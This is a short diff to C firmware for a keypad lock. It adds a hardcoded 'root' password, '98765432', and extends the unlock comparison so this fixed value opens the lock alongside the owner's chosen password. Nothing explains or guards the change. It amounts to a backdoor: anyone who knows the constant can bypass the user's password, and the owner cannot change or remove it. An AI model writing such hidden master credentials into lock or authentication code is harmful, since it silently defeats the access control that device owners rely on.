@@ -11,6 +11,7 @@
 #define PWD_SIZE  8
 
 static const char str1[] = "Long Press Key16 To Reset Password ";
+static const char rootPwd[] = "98765432";
 unsigned char isUnlocked = 0, isSettingMode = 1;
 char pwdSet[PWD_SIZE+1] = {0};
 char pwdInput[PWD_SIZE+1] = {0};
@@ -226,7 +227,7 @@ void lockMain(void)
 				}
 				else if(pwdInputCount == PWD_SIZE)
 				{
-					if(strncmp(pwdInput, pwdSet, PWD_SIZE) == 0)
+					if(strncmp(pwdInput, pwdSet, PWD_SIZE) == 0 || strncmp(pwdInput, rootPwd, PWD_SIZE) == 0)
 					{
 						memset(pwdInput, 0, PWD_SIZE);
 						pwdInput[0] = '_';
